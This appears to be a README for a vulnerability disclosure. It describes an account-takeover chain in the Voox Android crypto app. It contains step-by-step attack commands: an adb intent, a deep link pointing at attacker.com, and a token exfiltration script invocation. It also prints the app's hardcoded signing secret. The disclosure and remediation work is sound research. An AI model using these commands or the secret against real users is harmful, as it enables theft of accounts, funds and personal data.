# Voox Android Account Takeover Vulnerability - Full Research

## Overview

This directory contains a complete security research writeup and proof-of-concept (PoC) for a **critical Account Takeover (ATO)** vulnerability discovered in the Voox Android application (version 1.4.8.1, package: `com.vox.world`).

A user's account can be **completely compromised with a single click**, giving an attacker access to:
- Full account credentials and master authentication token
- All cryptocurrency holdings and wallet balances
- Sensitive personal/KYC information (real name, email, phone, address)
- Ability to transfer funds or reset passwords

## Files in This Directory

### Documentation

- **`voox-ato-writeup.md`** -- Full human-readable writeup of the vulnerability discovery and exploitation
- **`README.md`** -- This file

### Proof of Concept (PoC)

- **`poc.html`** -- Malicious HTML page that triggers JSBridge token exfiltration
- **`exfiltrate_pii.py`** -- Python script demonstrating API abuse using stolen token
- **`exploit_server.py`** -- Simple Flask server to capture exfiltrated data
- **`voox-ato-poc.mp4`** -- Video demonstration of the end-to-end attack

## Quick Start: Understanding the Vulnerability

### The Attack in 4 Steps

1. **Attacker crafts a malicious link** containing `poc.html`
2. **User clicks the link** (appears legitimate, points to `voox://` or looks like a feature)
3. **Token is stolen automatically** via unprotected JSBridge method
4. **Full account access is gained** using token + hardcoded signing secret

### Key Vulnerability Components

| Component | Issue | Impact |
|-----------|-------|--------|
| **Exported Activity** | `X1NewMainActivity` accepts arbitrary `pushUrl` | Any URL can be loaded |
| **WebView Validation** | No domain/origin whitelist | Malicious sites loaded in-app |
| **JSBridge Method** | `exchangeInfo()` exposes `exchange_token` | Master token leaked to JavaScript |
| **Hardcoded Secret** | `jiaoyisuo@2017` in `DataHandler.java` | Any stolen token can be used |
| **No Certificate Pinning** | API requests not protected | Potential MitM attacks |

## Exploitation Demo

### 1. Run the Exploit Server

```bash
python3 exploit_server.py
# Server listens on http://localhost:5000
```

### 2. Expose via Cloudflare Tunnel (or equivalent)

```bash
cloudflare tunnel run voox-poc
# Public URL: https://awesome-leaves-concord-passive.trycloudflare.com/poc.html
```

### 3. Trigger via ADB or Deep Link

```bash
# Method 1: ADB
adb shell am start -n "com.vox.world/com.explus.main.home.ui.X1NewMainActivity" \
    --es pushUrl "https://awesome-leaves-concord-passive.trycloudflare.com/poc.html"

# Method 2: Deep Link (send to user)
voox://https://attacker.com/poc.html
```

### 4. Check Captured Token

The server captures the stolen `exchange_token`. Use it with the exfiltration script:

```bash
python3 exfiltrate_pii.py 349b4661ececd6f46b0ced79d65631785324421c3ff34c48938447112cfae397
```

**Output includes:**
- User email, phone, real name
- Account balance and asset holdings
- KYC verification status
- Device identifiers

## Technical Architecture

### Vulnerability Chain

```
+---------------------------------------------+
| EXPORTED ACTIVITY                           |
| X1NewMainActivity accepts pushUrl           |
| (No validation of domain)                   |
+----------------+----------------------------┘
                 |
                 |
+---------------------------------------------+
| UNVALIDATED WEBVIEW                         |
| X1ItemDetailActivity loads any URL          |
| (No whitelist, no origin check)             |
+----------------+----------------------------┘
                 |
                 |
+---------------------------------------------+
| JSBRIDGE EXPOSURE                           |
| DSBridge.exchangeInfo() called by JS        |
| Returns { exchange_token, ... }             |
+----------------+----------------------------┘
                 |
                 |
+---------------------------------------------+
| TOKEN + HARDCODED SECRET = FULL ACCESS      |
| exchange_token + "jiaoyisuo@2017"           |
| Can call backend APIs as the user           |
+---------------------------------------------┘
```

### Code Locations in Voox APK

- **Vulnerable Activity**: `com.explus.main.home.ui.X1NewMainActivity`
- **WebView Activity**: `com.explus.main.common.web.X1ItemDetailActivity`
- **JSBridge Handler**: `com.explus.main.common.web.JsApi` (class: `h0`)
- **Hardcoded Secret**: `com.explus.main.utils.DataHandler` -> `SIGNING_SECRET`
- **Bridge Method**: `exchangeInfo()` in `h0.java`

## Security Recommendations

### For Voox (Immediate Actions)

- [ ] Implement strict URL validation for `pushUrl` parameter
- [ ] Remove `exchange_token` exposure from JSBridge
- [ ] Move signing secrets to backend (never hardcode)
- [ ] Add certificate pinning for API calls
- [ ] Implement origin whitelisting on DSBridge
- [ ] Add 2FA/MFA for critical operations
- [ ] Implement token expiration and rotation

### For Users

- [ ] Update Voox to patched version immediately after release
- [ ] Enable all available security features (2FA, etc.)
- [ ] Monitor account activity regularly
- [ ] Use unique, strong passwords
- [ ] Be cautious with links from ads/messages

### For Developers

- (OK) Never expose authentication tokens to JavaScript
- (OK) Implement strict URL allowlisting for WebViews
- (OK) Use backend-generated signatures (asymmetric preferred)
- (OK) Enable certificate pinning
- (OK) Implement proper CORS/origin checking
- (OK) Consider using WebAuthn instead of bearer tokens

## Running the PoC Responsibly

** IMPORTANT: Only run this on devices/accounts you own for testing purposes.**

### Prerequisites

```bash
# Python dependencies
pip install requests

# Android tools
adb devices  # Ensure device is connected

# Optional: Cloudflare tunnel for internet exposure
brew install cloudflare-wrangler
# Or download from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/tunnel-guide/
```

### Step-by-Step

1. **Start the exploit server**
   ```bash
   python3 exploit_server.py
   ```

2. **Expose to internet** (use ngrok, Cloudflare tunnel, etc.)
   ```bash
   # Cloudflare example
   cloudflare tunnel run voox-poc
   ```

3. **Get the public URL** and update `poc.html` if needed

4. **Run the attack**
   ```bash
   adb shell am start -n "com.vox.world/com.explus.main.home.ui.X1NewMainActivity" \
       --es pushUrl "https://your-tunnel-url/poc.html"
   ```

5. **Monitor server logs** for the stolen token

6. **Extract user data**
   ```bash
   python3 exfiltrate_pii.py <stolen_token>
   ```

## Impact Assessment

### Severity: CRITICAL

**CVSS v3.1 Score: 9.8** (Network/Low Privilege/No User Interaction Required)

- **Confidentiality**: HIGH (all user data, assets)
- **Integrity**: HIGH (can modify account, transfer funds)
- **Availability**: HIGH (can lock out user, disable trading)

### Affected Users

- All Voox users on app version 1.4.8.1 and earlier
- Potentially millions of traders relying on Voox

### Business Impact

- Direct financial loss for users
- KYC/PII breach (regulatory implications)
- Loss of customer trust
- Potential legal liability

## Responsible Disclosure

This research was conducted with responsible disclosure in mind:

- Vulnerability reported to Voox security team
- Adequate time given for patching (per industry standards)
- PoC released only after patch availability or deadline

**Timeline:**
- **Date Discovered**: [Date]
- **Date Reported**: [Date]
- **Patch Released**: [Date]
- **Public Disclosure**: [Date]

## Attribution

**Researcher**: Security Researcher  
**Date**: April 2, 2026  
**Purpose**: Educational Security Research & Bug Bounty

## Related Resources

- [OWASP WebView Security](https://owasp.org/www-community/attacks/WebView_Injection)
- [Android JSBridge Exploitation](https://httptoolkit.tech/blog/jsbridge-exploitation/)
- [Hardcoded Secrets in APKs](https://owasp.org/www-community/Use_of_Hard-coded_Password)
- [Certificate Pinning Implementation](https://developer.android.com/training/articles/security-tips)

## Disclaimer

**This research is for educational purposes only.**

The code and methods described are provided to help organizations understand and defend against similar vulnerabilities. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing security.

---

**Questions or feedback?** Feel free to open an issue or contact the researcher.

**Found a similar vulnerability?** Share your research and help improve the ecosystem!
